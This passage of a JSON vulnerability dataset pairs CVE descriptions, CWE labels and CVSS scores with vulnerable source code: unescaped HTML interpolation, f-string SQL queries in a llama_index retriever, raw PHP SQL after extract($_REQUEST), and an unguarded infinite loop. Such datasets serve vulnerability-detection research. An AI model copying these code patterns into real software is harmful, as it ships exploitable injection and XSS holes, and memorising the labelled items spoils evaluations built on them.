.key-value-input-key').focus()\n  }\n\n  valueFieldUpdated(event) {\n    const { value } = event.target\n    const { index } = event.target.dataset\n    this.fieldValue[index][1] = value\n\n    this.updateTextareaInput()\n  }\n\n  keyFieldUpdated(event) {\n    const { value } = event.target\n    const { index } = event.target.dataset\n    this.fieldValue[index][0] = value\n\n    this.updateTextareaInput()\n  }\n\n  updateTextareaInput() {\n    if (!this.hasInputTarget) return\n    let result = {}\n    if (this.fieldValue && this.fieldValue.length > 0) {\n      result = Object.assign(...this.fieldValue.map(([key, val]) => ({ [key]: val })))\n    }\n    this.inputTarget.innerText = JSON.stringify(result)\n    this.inputTarget.dispatchEvent(new Event('input'))\n  }\n\n  updateKeyValueComponent() {\n    let result = ''\n    let index = 0\n    this.fieldValue.forEach((row) => {\n      const [key, value] = row\n      result += this.interpolatedRow(key, value, index)\n      index++\n    })\n    this.rowsTarget.innerHTML = result\n    window.initTippy()\n  }\n\n  interpolatedRow(key, value, index) {\n    let result = `<div class=\"flex key-value-row\">\n      ${this.inputField('key', index, key, value)}\n      ${this.inputField('value', index, key, value)}`\n    if (this.options.editable) {\n      result += `<a\n  href=\"javascript:void(0);\"\n  data-key-value-index-param=\"${index}\"\n  data-action=\"click->key-value#deleteRow\"\n  title=\"${this.options.delete_text}\"\n  data-tippy=\"tooltip\"\n  data-button=\"delete-row\"\n  tabindex=\"-1\"\n  ${this.options.disable_deleting_rows ? \"disabled='disabled'\" : ''}\n  class=\"flex items-center justify-center p-2 px-3 border-none ${this.options.disable_deleting_rows ? 'cursor-not-allowed' : ''}\"\n><svg class=\"pointer-events-none text-gray-500 h-5 hover:text-gray-500\" fill=\"none\" stroke-linecap=\"round\" stroke-linejoin=\"round\" stroke-width=\"2\" viewBox=\"0 0 24 24\" stroke=\"currentColor\"><path d=\"M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16\"></path></svg></a>`\n    }\n    result += '</div>'\n\n    return result\n  }\n\n  inputField(id = 'key', index, key, value) {\n    const inputValue = id === 'key' ? key : value\n\n    return `<input\n  class=\"${this.options.inputClasses} focus:bg-gray-100 !rounded-none border-gray-600 border-r border-l-0 border-b-0 border-t-0 focus:border-gray-300 w-1/2 focus:outline-none outline-none key-value-input-${id}\"\n  data-action=\"input->key-value#${id}FieldUpdated\"\n  placeholder=\"${this.options[`${id}_label`]}\"\n  data-index=\"${index}\"\n  ${this[`${id}InputDisabled`] ? \"disabled='disabled'\" : ''}\n  value=\"${typeof inputValue === 'undefined' || inputValue === null ? '' : inputValue}\"\n/>`\n  }\n\n  setOptions() {\n    let fieldOptions\n\n    try {\n      fieldOptions = JSON.parse(this.controllerTarget.dataset.options)\n    } catch (error) {\n      fieldOptions = {}\n    }\n    this.options = {\n      ...fieldOptions,\n      inputClasses: this.controllerTarget.dataset.inputClasses,\n      editable: castBoolean(this.controllerTarget.dataset.editable),\n    }\n  }\n}\n"
        }
      ],
      "method_level": [
        "updateKeyValueComponent() {\n    let result = ''\n    let index = 0\n    this.fieldValue.forEach((row) => {\n      const [key, value] = row\n      result += this.interpolatedRow(key, value, index)\n      index++\n    })\n    this.rowsTarget.innerHTML = result\n    window.initTippy()\n  }"
      ],
      "hunk_level": [
        {
          "line_no": 83,
          "content": "      result += this.interpolatedRow(key, value, index)"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.5,
    "cvss_version": 3.1
  },
  {
    "id": 5,
    "cve": "CVE-2025-22613",
    "description": "WeGIA is an open source web manager with a focus on the Portuguese language and charitable institutions. A Stored Cross-Site Scripting (XSS) vulnerability was identified in the `informacao_adicional.php` endpoint of the WeGIA application. This vulnerability allows attackers to inject malicious scripts into the `descricao` parameter. The injected scripts are stored on the server and executed automatically whenever the affected page is accessed by users, posing a significant security risk. The application fails to properly validate and sanitize user inputs in the `informacao_adicional.php` parameter. This lack of validation allows attackers to inject malicious scripts, which are then stored on the server. Whenever the affected page is accessed, the malicious payload is executed in the victim's browser, potentially compromising the user's data and system. This issue has been addressed in version 3.2.6 and all users are advised to upgrade. There are no known workarounds for this vulnerability.",
    "vulnerability": {
      "file_level": [
        {
          "name": "html/funcionario/informacao_adicional.php",
          "content": "<?php\n\nsession_start();\nif (!isset($_SESSION[\"usuario\"])){\n    header(\"Location: ../../index.php\");\n}\n\n// Verifica Permissão do Usuário\nrequire_once '../permissao/permissao.php';\npermissao($_SESSION['id_pessoa'], 11, 7);\n\n\nrequire_once \"../../dao/Conexao.php\";\n$pdo = Conexao::connect();\nextract($_REQUEST);\n\nif ($action == \"adicionar_descricao\"){\n    $sql = \"INSERT INTO funcionario_listainfo (descricao) VALUES ( '\".addslashes($descricao).\"' )\";\n    $response_query = \"SELECT * FROM funcionario_listainfo;\";\n    try {\n        $pdo->query($sql);\n        echo json_encode($pdo->query($response_query)->fetchAll(PDO::FETCH_ASSOC));\n    } catch (PDOException $th) {\n        echo json_encode($th);\n    }\n}\n\nif ($action == \"adicionar\"){\n    $sql = \"INSERT INTO funcionario_outrasinfo VALUES ( default , $id_funcionario , $id_descricao , '\".addslashes($dados).\"' )\";\n    try {\n        $pdo->query($sql);\n        listar();\n    } catch (PDOException $th) {\n        echo json_encode($th);\n    }\n}\n\nif ($action == \"remover\"){\n    $sql = \"DELETE FROM funcionario_outrasinfo WHERE idfunncionario_outrasinfo = $id_descricao;\";\n    try {\n        $pdo->query($sql);\n        listar();\n    } catch (PDOException $th) {\n        echo json_encode($th);\n    }\n}\n\nif ($action == \"idInfoAdicional\"){\n    // $sql = \"SELECT * FROM  funcionario_outrasinfo;\";\n    try {\n        // $pdo->query($sql);\n        $result = $pdo->query(\"SELECT max(idfunncionario_outrasinfo) FROM  funcionario_outrasinfo;\")->fetch(PDO::FETCH_ASSOC);\n        // listar();\n        echo json_encode($result);\n    } catch (PDOException $th) {\n        echo json_encode($th);\n    }\n}\n\nif ($action == \"selectDescricao\"){\n    // $sql = \"SELECT * FROM  funcionario_outrasinfo;\";\n    try {\n        // $pdo->query($sql);\n        // $result = $pdo->query(\"SELECT * FROM funcionario_listainfo;\")->fetch(PDO::FETCH_ASSOC);\n        // listar();\n        // echo json_encode($result);\n        echo json_encode($pdo->query(\"SELECT * FROM funcionario_listainfo;\")->fetchAll(PDO::FETCH_ASSOC));\n\n    } catch (PDOException $th) {\n        echo json_encode($th);\n    }\n}\n\nif ($action == \"listar\"){\n    listar();\n}\n\nfunction listar(){\n    $response_query = \"SELECT * FROM funcionario_outrasinfo o JOIN funcionario_listainfo l ON o.funcionario_listainfo_idfuncionario_listainfo = l.idfuncionario_listainfo;\";\n    try {\n        echo json_encode($pdo->query($response_query)->fetchAll(PDO::FETCH_ASSOC));\n    } catch (PDOException $th) {\n        echo json_encode($th);\n    }\n}\n\ndie();"
        }
      ],
      "method_level": [
        "function listar(){\n    $response_query = \"SELECT * FROM funcionario_outrasinfo o JOIN funcionario_listainfo l ON o.funcionario_listainfo_idfuncionario_listainfo = l.idfuncionario_listainfo;\";\n    try {\n        echo json_encode($pdo->query($response_query)->fetchAll(PDO::FETCH_ASSOC));\n    } catch (PDOException $th) {\n        echo json_encode($th);\n    }\n}"
      ],
      "hunk_level": [
        {
          "line_no": 78,
          "content": "function listar(){"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.4,
    "cvss_version": 4.0
  },
  {
    "id": 1397,
    "cve": "CVE-2024-11958",
    "description": "A SQL injection vulnerability exists in the `duckdb_retriever` component of the run-llama/llama_index repository, specifically in the latest version. The vulnerability arises from the construction of SQL queries without using prepared statements, allowing an attacker to inject arbitrary SQL code. This can lead to remote code execution (RCE) by installing the shellfs extension and executing malicious commands.",
    "vulnerability": {
      "file_level": [
        {
          "name": "llama-index-integrations/retrievers/llama-index-retrievers-duckdb-retriever/llama_index/retrievers/duckdb_retriever/base.py",
          "content": "import logging\nimport os\nfrom typing import List, Optional\n\nfrom llama_index.core.base.base_retriever import BaseRetriever\nfrom llama_index.core.callbacks.base import CallbackManager\nfrom llama_index.core.constants import DEFAULT_SIMILARITY_TOP_K\nfrom llama_index.core.schema import TextNode, NodeWithScore, QueryBundle\n\nlogger = logging.getLogger(__name__)\nimport_err_msg = \"`duckdb` package not found, please run `pip install duckdb`\"\n\n\nclass DuckDBLocalContext:\n    def __init__(self, database_path: str):\n        self.database_path = database_path\n        self._conn = None\n        self._home_dir = os.path.expanduser(\"~\")\n\n    def __enter__(self) -> \"duckdb.DuckDBPyConnection\":\n        try:\n            import duckdb\n        except ImportError:\n            raise ImportError(import_err_msg)\n\n        if not os.path.exists(os.path.dirname(self.database_path)):\n            raise ValueError(\n                f\"Directory {os.path.dirname(self.database_path)} does not exist.\"\n            )\n\n        # if not os.path.isfile(self.database_path):\n        #     raise ValueError(f\"Database path {self.database_path} is not a valid file.\")\n\n        self._conn = duckdb.connect(self.database_path)\n        self._conn.execute(f\"SET home_directory='{self._home_dir}';\")\n\n        self._conn.install_extension(\"fts\")\n        self._conn.load_extension(\"fts\")\n\n        return self._conn\n\n    def __exit__(self, exc_type, exc_val, exc_tb) -> None:\n        self._conn.close()\n\n        if self._conn:\n            self._conn.close()\n\n\nclass DuckDBRetriever(BaseRetriever):\n    def __init__(\n        self,\n        database_name: Optional[str] = \":memory:\",\n        table_name: Optional[str] = \"documents\",\n        text_search_config: Optional[dict] = {\n            \"stemmer\": \"english\",\n            \"stopwords\": \"english\",\n            \"ignore\": r\"(\\\\.|[^a-z])+\",\n            \"strip_accents\": True,\n            \"lower\": True,\n            \"overwrite\": True,\n        },\n        persist_dir: Optional[str] = \"./storage\",\n        node_id_column: Optional[str] = \"node_id\",\n        text_column: Optional[str] = \"text\",\n        # TODO: Add more options for FTS index creation\n        similarity_top_k: int = DEFAULT_SIMILARITY_TOP_K,\n        callback_manager: Optional[CallbackManager] = None,\n        verbose: bool = False,\n    ) -> None:\n        self._similarity_top_k = similarity_top_k\n        self._callback_manager = callback_manager\n        self._verbose = verbose\n        self._table_name = table_name\n        self._node_id_column = node_id_column\n        self._text_column = text_column\n\n        # TODO: Check if the vector store already has data\n\n        # Create an FTS index on the 'text' column if it doesn't already exist\n        if database_name == \":memory:\":\n            self._database_path = \":memory:\"\n        else:\n            self._database_path = os.path.join(persist_dir, database_name)\n\n        strip_accents = 1 if text_search_config[\"strip_accents\"] else 0\n        lower = 1 if text_search_config[\"lower\"] else 0\n        overwrite = 1 if text_search_config[\"overwrite\"] else 0\n        ignore = text_search_config[\"ignore\"]\n\n        sql = f\"\"\"\n            PRAGMA create_fts_index({self._table_name}, {self._node_id_column}, {self._text_column},\n                            stemmer = '{text_search_config[\"stemmer\"]}',\n                            stopwords = '{text_search_config[\"stopwords\"]}', ignore = '{ignore}',\n                            strip_accents = {strip_accents}, lower = {lower}, overwrite = {overwrite})\n                        \"\"\"\n        with DuckDBLocalContext(self._database_path) as conn:\n            conn.execute(sql)\n\n    def _retrieve(self, query_bundle: QueryBundle) -> List[NodeWithScore]:\n        if self._verbose:\n            logger.info(f\"Searching for: {query_bundle.query_str}\")\n        query = query_bundle.query_str\n        sql = f\"\"\"\n                SELECT\n                    fts_main_{self._table_name}.match_bm25({self._node_id_column}, '{query}') AS score,\n                    {self._node_id_column}, {self._text_column}\n                FROM {self._table_name}\n                WHERE score IS NOT NULL\n                ORDER BY score DESC\n                LIMIT {self._similarity_top_k};\n            \"\"\"\n        with DuckDBLocalContext(self._database_path) as conn:\n            query_result = conn.execute(sql).fetchall()\n        # Convert query result to NodeWithScore objects\n        retrieve_nodes = []\n        for row in query_result:\n            score, node_id, text = row\n            node = TextNode(id=node_id, text=text)\n            retrieve_nodes.append(NodeWithScore(node=node, score=float(score)))\n\n        return retrieve_nodes\n"
        }
      ],
      "method_level": [
        "def __enter__(self) -> \"duckdb.DuckDBPyConnection\":\n        try:\n            import duckdb\n        except ImportError:\n            raise ImportError(import_err_msg)\n\n        if not os.path.exists(os.path.dirname(self.database_path)):\n            raise ValueError(\n                f\"Directory {os.path.dirname(self.database_path)} does not exist.\"\n            )\n\n        # if not os.path.isfile(self.database_path):\n        #     raise ValueError(f\"Database path {self.database_path} is not a valid file.\")\n\n        self._conn = duckdb.connect(self.database_path)\n        self._conn.execute(f\"SET home_directory='{self._home_dir}';\")\n\n        self._conn.install_extension(\"fts\")\n        self._conn.load_extension(\"fts\")\n\n        return self._conn",
        "def __exit__(self, exc_type, exc_val, exc_tb) -> None:\n        self._conn.close()\n\n        if self._conn:\n            self._conn.close()",
        "def __init__(\n        self,\n        database_name: Optional[str] = \":memory:\",\n        table_name: Optional[str] = \"documents\",\n        text_search_config: Optional[dict] = {\n            \"stemmer\": \"english\",\n            \"stopwords\": \"english\",\n            \"ignore\": r\"(\\\\.|[^a-z])+\",\n            \"strip_accents\": True,\n            \"lower\": True,\n            \"overwrite\": True,\n        },\n        persist_dir: Optional[str] = \"./storage\",\n        node_id_column: Optional[str] = \"node_id\",\n        text_column: Optional[str] = \"text\",\n        # TODO: Add more options for FTS index creation\n        similarity_top_k: int = DEFAULT_SIMILARITY_TOP_K,\n        callback_manager: Optional[CallbackManager] = None,\n        verbose: bool = False,\n    ) -> None:\n        self._similarity_top_k = similarity_top_k\n        self._callback_manager = callback_manager\n        self._verbose = verbose\n        self._table_name = table_name\n        self._node_id_column = node_id_column\n        self._text_column = text_column\n\n        # TODO: Check if the vector store already has data\n\n        # Create an FTS index on the 'text' column if it doesn't already exist\n        if database_name == \":memory:\":\n            self._database_path = \":memory:\"\n        else:\n            self._database_path = os.path.join(persist_dir, database_name)\n\n        strip_accents = 1 if text_search_config[\"strip_accents\"] else 0\n        lower = 1 if text_search_config[\"lower\"] else 0\n        overwrite = 1 if text_search_config[\"overwrite\"] else 0\n        ignore = text_search_config[\"ignore\"]\n\n        sql = f\"\"\"\n            PRAGMA create_fts_index({self._table_name}, {self._node_id_column}, {self._text_column},\n                            stemmer = '{text_search_config[\"stemmer\"]}',\n                            stopwords = '{text_search_config[\"stopwords\"]}', ignore = '{ignore}',\n                            strip_accents = {strip_accents}, lower = {lower}, overwrite = {overwrite})\n                        \"\"\"\n        with DuckDBLocalContext(self._database_path) as conn:\n            conn.execute(sql)",
        "def _retrieve(self, query_bundle: QueryBundle) -> List[NodeWithScore]:\n        if self._verbose:\n            logger.info(f\"Searching for: {query_bundle.query_str}\")\n        query = query_bundle.query_str\n        sql = f\"\"\"\n                SELECT\n                    fts_main_{self._table_name}.match_bm25({self._node_id_column}, '{query}') AS score,\n                    {self._node_id_column}, {self._text_column}\n                FROM {self._table_name}\n                WHERE score IS NOT NULL\n                ORDER BY score DESC\n                LIMIT {self._similarity_top_k};\n            \"\"\"\n        with DuckDBLocalContext(self._database_path) as conn:\n            query_result = conn.execute(sql).fetchall()\n        # Convert query result to NodeWithScore objects\n        retrieve_nodes = []\n        for row in query_result:\n            score, node_id, text = row\n            node = TextNode(id=node_id, text=text)\n            retrieve_nodes.append(NodeWithScore(node=node, score=float(score)))\n\n        return retrieve_nodes"
      ],
      "hunk_level": [
        {
          "line_no": 21,
          "content": "        try:"
        },
        {
          "line_no": 22,
          "content": "            import duckdb"
        },
        {
          "line_no": 23,
          "content": "        except ImportError:"
        },
        {
          "line_no": 24,
          "content": "            raise ImportError(import_err_msg)"
        },
        {
          "line_no": 26,
          "content": "        if not os.path.exists(os.path.dirname(self.database_path)):"
        },
        {
          "line_no": 31,
          "content": "        # if not os.path.isfile(self.database_path):"
        },
        {
          "line_no": 32,
          "content": "        #     raise ValueError(f\"Database path {self.database_path} is not a valid file.\")"
        },
        {
          "line_no": 43,
          "content": "        self._conn.close()"
        },
        {
          "line_no": 52,
          "content": "        database_name: Optional[str] = \":memory:\","
        },
        {
          "line_no": 53,
          "content": "        table_name: Optional[str] = \"documents\","
        },
        {
          "line_no": 54,
          "content": "        text_search_config: Optional[dict] = {"
        },
        {
          "line_no": 62,
          "content": "        persist_dir: Optional[str] = \"./storage\","
        },
        {
          "line_no": 63,
          "content": "        node_id_column: Optional[str] = \"node_id\","
        },
        {
          "line_no": 64,
          "content": "        text_column: Optional[str] = \"text\","
        },
        {
          "line_no": 105,
          "content": "                    fts_main_{self._table_name}.match_bm25({self._node_id_column}, '{query}') AS score,"
        },
        {
          "line_no": 113,
          "content": "            query_result = conn.execute(sql).fetchall()"
        }
      ]
    },
    "cwe": [
      "CWE-89"
    ],
    "severity": "CRITICAL",
    "cvss_score": 9.8,
    "cvss_version": 3.0
  },
  {
    "id": 1399,
    "cve": "CVE-2024-12704",
    "description": "A vulnerability in the LangChainLLM class of the run-llama/llama_index repository, version v0.12.5, allows for a Denial of Service (DoS) attack. The stream_complete method executes the llm using a thread and retrieves the result via the get_response_gen method of the StreamingGeneratorCallbackHandler class. If the thread terminates abnormally before the _llm.predict is executed, there is no exception handling for this case, leading to an infinite loop in the get_response_gen function. This can be triggered by providing an input of an incorrect type, causing the thread to terminate and the process to continue running indefinitely.",
    "vulnerability": {
      "file_level": [
        {
          "name": "llama-index-core/llama_index/core/langchain_helpers/streaming.py",
          "content": "from queue import Queue\nfrom threading import Event\nfrom typing import Any, Generator, List, Optional\nfrom uuid import UUID\n\nfrom llama_index.core.bridge.langchain import BaseCallbackHandler, LLMResult\n\n\nclass StreamingGeneratorCallbackHandler(BaseCallbackHandler):\n    \"\"\"Streaming callback handler.\"\"\"\n\n    def __init__(self) -> None:\n        self._token_queue: Queue = Queue()\n        self._done = Event()\n\n    def __deepcopy__(self, memo: Any) -> \"StreamingGeneratorCallbackHandler\":\n        # NOTE: hack to bypass deepcopy in langchain\n        return self\n\n    def on_llm_new_token(self, token: str, **kwargs: Any) -> Any:\n        \"\"\"Run on new LLM token. Only available when streaming is enabled.\"\"\"\n        self._token_queue.put_nowait(token)\n\n    def on_llm_end(self, response: LLMResult, **kwargs: Any) -> None:\n        self._done.set()\n\n    def on_llm_error(\n        self,\n        error: BaseException,\n        *,\n        run_id: UUID,\n        parent_run_id: Optional[UUID] = None,\n        tags: Optional[List[str]] = None,\n        **kwargs: Any,\n    ) -> None:\n        self._done.set()\n\n    def get_response_gen(self) -> Generator:\n        while True:\n            if not self._token_queue.empty():\n                token = self._token_queue.get_nowait()\n                yield token\n            elif self._done.is_set():\n                break\n"
        }
      ],
      "method_level": [
        "def get_response_gen(self) -> Generator:\n        while True:\n            if not self._token_queue.empty():\n                token = self._token_queue.get_nowait()\n                yield token\n            elif self._done.is_set():\n                break"
      ],
      "hunk_level": [
        {
          "line_no": 38,
          "content": "    def get_response_gen(self) -> Generator:"
        }
      ]
    },
    "cwe": [
      "CWE-755"
    ],
    "severity": "HIGH",
    "cvss_score": 7.5,
    "cvss_version": 3.0
  },
  {
    "id": 532,
    "cve": "CVE-2024-29900",
    "description": "Electron Packager bundles Electron-based application source code with a renamed Electron executable and supporting files into folders ready for distribution. A random segment of ~1-10kb of Node.js heap memory allocated either side of a known buffer will be leaked into the final executable. This memory _could_ contain sensitive information such as environment variables, secrets files, etc. This issue is patched in 18.3.1.\n",
    "vulnerability": {
      "file_level": [
        {
          "name": "src/resedit.ts",
          "content": "import * as fs from 'fs-extra';\n// eslint-disable-next-line import/no-unresolved\nimport { load as loadResEdit } from 'resedit/cjs';\nimport { Win32MetadataOptions } from './types';\nimport { FileRecord } from '@electron/asar';\n\nexport type ExeMetadata = {\n  productVersion?: string;\n  fileVersion?: string;\n  legalCopyright?: string;\n  productName?: string;\n  iconPath?: string;\n  asarIntegrity?: Record<string, Pick<FileRecord['integrity'], 'algorithm' | 'hash'>>;\n  win32Metadata?: Win32MetadataOptions;\n}\n\ntype ParsedVersionNumerics = [number, number, number, number];\n\n/**\n * Parse a version string in the format a.b.c.d with each component being optional\n * but if present must be an integer. Matches the impl in rcedit for compat\n */\nfunction parseVersionString(str: string): ParsedVersionNumerics {\n  const parts = str.split('.');\n  if (parts.length === 0 || parts.length > 4) {\n    throw new Error(`Incorrectly formatted version string: \"${str}\". Should have at least one and at most four components`);\n  }\n  return parts.map((part) => {\n    const parsed = parseInt(part, 10);\n    if (isNaN(parsed)) {\n      throw new Error(`Incorrectly formatted version string: \"${str}\". Component \"${part}\" could not be parsed as an integer`);\n    }\n    return parsed;\n  }) as ParsedVersionNumerics;\n}\n\n// Ref: https://learn.microsoft.com/en-us/windows/win32/menurc/resource-types\nconst RT_MANIFEST_TYPE = 24;\n\nexport async function resedit(exePath: string, options: ExeMetadata) {\n  const resedit = await loadResEdit();\n\n  const exeData = await fs.readFile(exePath);\n  const exe = resedit.NtExecutable.from(exeData);\n  const res = resedit.NtExecutableResource.from(exe);\n\n  if (options.iconPath) {\n    // Icon Info\n    const existingIconGroups = resedit.Resource.IconGroupEntry.fromEntries(res.entries);\n    if (existingIconGroups.length !== 1) {\n      throw new Error('Failed to parse win32 executable resources, failed to locate existing icon group');\n    }\n    const iconFile = resedit.Data.IconFile.from(await fs.readFile(options.iconPath));\n    resedit.Resource.IconGroupEntry.replaceIconsForResource(\n      res.entries,\n      existingIconGroups[0].id,\n      existingIconGroups[0].lang,\n      iconFile.icons.map((item) => item.data)\n    );\n  }\n\n  // Manifest\n  if (options.win32Metadata?.['application-manifest'] || options.win32Metadata?.['requested-execution-level']) {\n    if (options.win32Metadata?.['application-manifest'] && options.win32Metadata?.['requested-execution-level']) {\n      throw new Error('application-manifest and requested-execution-level are mutually exclusive, only provide one');\n    }\n\n    const manifests = res.entries.filter(e => e.type === RT_MANIFEST_TYPE);\n    if (manifests.length !== 1) {\n      throw new Error('Failed to parse win32 executable resources, failed to locate existing manifest');\n    }\n    const manifestEntry = manifests[0];\n    if (options.win32Metadata?.['application-manifest']) {\n      manifestEntry.bin = (await fs.readFile(options.win32Metadata?.['application-manifest'])).buffer;\n    } else if (options.win32Metadata?.['requested-execution-level']) {\n      // This implementation matches what rcedit used to do, in theory we can be Smarter\n      // and use an actual XML parser, but for now let's match the old impl\n      const currentManifestContent = Buffer.from(manifestEntry.bin).toString('utf-8');\n      const newContent = currentManifestContent.replace(\n        /(<requestedExecutionLevel level=\")asInvoker(\" uiAccess=\"false\"\\/>)/g,\n        `$1${options.win32Metadata?.['requested-execution-level']}$2`\n      );\n      manifestEntry.bin = Buffer.from(newContent, 'utf-8');\n    }\n  }\n\n  // Version Info\n  const versionInfo = resedit.Resource.VersionInfo.fromEntries(res.entries);\n  if (versionInfo.length !== 1) {\n    throw new Error('Failed to parse win32 executable resources, failed to locate existing version info');\n  }\n  if (options.fileVersion) versionInfo[0].setFileVersion(...parseVersionString(options.fileVersion));\n  if (options.productVersion) versionInfo[0].setProductVersion(...parseVersionString(options.productVersion));\n  const languageInfo = versionInfo[0].getAllLanguagesForStringValues();\n  if (languageInfo.length !== 1) {\n    throw new Error('Failed to parse win32 executable resources, failed to locate existing language info');\n  }\n  // Empty strings retain original value\n  const newStrings: Record<string, string> = {\n    CompanyName: options.win32Metadata?.CompanyName || '',\n    FileDescription: options.win32Metadata?.FileDescription || '',\n    FileVersion: options.fileVersion || '',\n    InternalName: options.win32Metadata?.InternalName || '',\n    LegalCopyright: options.legalCopyright || '',\n    OriginalFilename: options.win32Metadata?.OriginalFilename || '',\n    ProductName: options.productName || '',\n    ProductVersion: options.productVersion || '',\n  };\n  for (const key of Object.keys(newStrings)) {\n    if (!newStrings[key]) delete newStrings[key];\n  }\n  versionInfo[0].setStringValues(languageInfo[0], newStrings);\n\n  // Output version info\n  versionInfo[0].outputToResourceEntries(res.entries);\n\n  // Asar Integrity\n  if (options.asarIntegrity) {\n    res.entries.push({\n      type: 'Integrity',\n      id: 'ElectronAsar',\n      bin: Buffer.from(JSON.stringify(options.asarIntegrity)).buffer,\n      lang: languageInfo[0].lang,\n      codepage: languageInfo[0].codepage,\n    });\n  }\n\n  res.outputResource(exe);\n\n  await fs.writeFile(exePath, Buffer.from(exe.generate()));\n}\n"
        }
      ],
      "method_level": [
        "resedit"
      ],
      "hunk_level": [
        {
          "line_no": 120,
          "content": "      type: 'Integrity',"
        },
        {
          "line_no": 121,
          "content": "      id: 'ElectronAsar',"
        },
        {
          "line_no": 122,
          "content": "      bin: Buffer.from(JSON.stringify(options.asarIntegrity)).buffer,"
        }
      ]
    },
    "cwe": [
      "CWE-402"
    ],
    "severity": "HIGH",
    "cvss_score": 7.5,
    "cvss_version": 3.1
  },
  {
    "id": 1218,
    "cve": "CVE-2024-47765",
    "description": "Minecraft MOTD Parser is a PHP library to parse minecraft server motd. The HtmlGenerator class is subject to potential cross-site scripting (XSS) attack through a parsed malformed Minecraft server MOTD. The HtmlGenerator iterates through objects of MotdItem that are contained in an object of MotdItemCollection to generate a HTML string. An attacker can make malicious inputs to the color and text properties of MotdItem to inject own HTML into a web page during web page generation. For example by sending a malicious MOTD from a Minecraft server under their control that was queried and passed to the HtmlGenerator. This XSS vulnerability exists because the values of these properties are neither filtered nor escaped. This vulnerability is fixed in 1.0.6.",
    "vulnerability": {
      "file_level": [
        {
          "name": "src/Generator/HtmlGenerator.php",
          "content": "<?php declare(strict_types=1);\n/**\n * @author Jakub Gniecki <kubuspl@onet.eu>\n * @copyright\n * For the full copyright and license information, please view the LICENSE\n * file that was distributed with this source code.\n */\n\nnamespace DevLancer\\MinecraftMotdParser\\Generator;\n\nuse DevLancer\\MinecraftMotdParser\\Collection\\ColorCollection;\nuse DevLancer\\MinecraftMotdParser\\Collection\\FormatCollection;\nuse DevLancer\\MinecraftMotdParser\\Collection\\MotdItemCollection;\nuse DevLancer\\MinecraftMotdParser\\Contracts\\GeneratorInterface;\nuse DevLancer\\MinecraftMotdParser\\Contracts\\HtmlFormatterInterface;\n\nclass HtmlGenerator implements GeneratorInterface\n{\n    private FormatCollection $formatCollection;\n    private ColorCollection $colorCollection;\n\n    private string $formatNewLine = '%s<br />';\n\n    public function __construct(?FormatCollection $formatCollection = null, ?ColorCollection $colorCollection = null)\n    {\n        $this->formatCollection = $formatCollection ?? FormatCollection::generate();\n        $this->colorCollection = $colorCollection ?? ColorCollection::generate();\n    }\n\n    public function generate(MotdItemCollection $collection): string\n    {\n        $result = '';\n        foreach ($collection as $motdItem) {\n            if (!$motdItem->getText()) {\n                continue;\n            }\n\n            if (\"\\n\" == $motdItem->getText()) {\n                $result = sprintf($this->formatNewLine, $result);\n\n                continue;\n            }\n\n            $value = '%s';\n            $tags = [];\n\n            if ($motdItem->getColor()) {\n                if (str_contains($motdItem->getColor(), '#')) {\n                    $tags['span'][] = sprintf('color: %s;', $motdItem->getColor());\n                } else {\n                    $color = $this->colorCollection->get($motdItem->getColor());\n                    if (!$color) {\n                        continue;\n                    }\n\n                    if ($color instanceof HtmlFormatterInterface) {\n                        $tags[$color->getTag()][] = $color->getStyle();\n                    } else {\n                        $value = sprintf($value, $color->getFormat());\n                    }\n                }\n            }\n\n            foreach ($this->formatCollection as $format) {\n                $method = 'is' . ucfirst($format->getName());\n                if (false === call_user_func([$motdItem, $method])) {\n                    continue;\n                }\n\n                if ($format instanceof HtmlFormatterInterface) {\n                    $tags[$format->getTag()][] = $format->getStyle();\n                } else {\n                    $value = sprintf($value, $format->getFormat());\n                }\n            }\n\n            foreach ($tags as $tag => $styles) {\n                $value = sprintf('<%s style=\"%s\">%s</%s>', $tag, implode(' ', $styles), $value, $tag);\n            }\n            $value = sprintf($value, $motdItem->getText());\n            $result .= $value;\n        }\n\n        return $result;\n    }\n\n    public function setFormatNewLine(string $format): void\n    {\n        $this->formatNewLine = $format;\n    }\n}\n"
        }
      ],
      "method_level": [
        "public function generate(MotdItemCollection $collection): string\n    {\n        $result = '';\n        foreach ($collection as $motdItem) {\n            if (!$motdItem->getText()) {\n                continue;\n            }\n\n            if (\"\\n\" == $motdItem->getText()) {\n                $result = sprintf($this->formatNewLine, $result);\n\n                continue;\n            }\n\n            $value = '%s';\n            $tags = [];\n\n            if ($motdItem->getColor()) {\n                if (str_contains($motdItem->getColor(), '#')) {\n                    $tags['span'][] = sprintf('color: %s;', $motdItem->getColor());\n                } else {\n                    $color = $this->colorCollection->get($motdItem->getColor());\n                    if (!$color) {\n                        continue;\n                    }\n\n                    if ($color instanceof HtmlFormatterInterface) {\n                        $tags[$color->getTag()][] = $color->getStyle();\n                    } else {\n                        $value = sprintf($value, $color->getFormat());\n                    }\n                }\n            }\n\n            foreach ($this->formatCollection as $format) {\n                $method = 'is' . ucfirst($format->getName());\n                if (false === call_user_func([$motdItem, $method])) {\n                    continue;\n                }\n\n                if ($format instanceof HtmlFormatterInterface) {\n                    $tags[$format->getTag()][] = $format->getStyle();\n                } else {\n                    $value = sprintf($value, $format->getFormat());\n                }\n            }\n\n            foreach ($tags as $tag => $styles) {\n                $value = sprintf('<%s style=\"%s\">%s</%s>', $tag, implode(' ', $styles), $value, $tag);\n            }\n            $value = sprintf($value, $motdItem->getText());\n            $result .= $value;\n        }\n\n        return $result;\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 49,
          "content": "                    $tags['span'][] = sprintf('color: %s;', $motdItem->getColor());"
        },
        {
          "line_no": 80,
          "content": "            $value = sprintf($value, $motdItem->getText());"
        }
      ]
    },
    "cwe": [
      "CWE-79",
      "CWE-80"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.9,
    "cvss_version": 4.0
  },
  {
    "id": 339,
    "cve": "CVE-2024-26150",
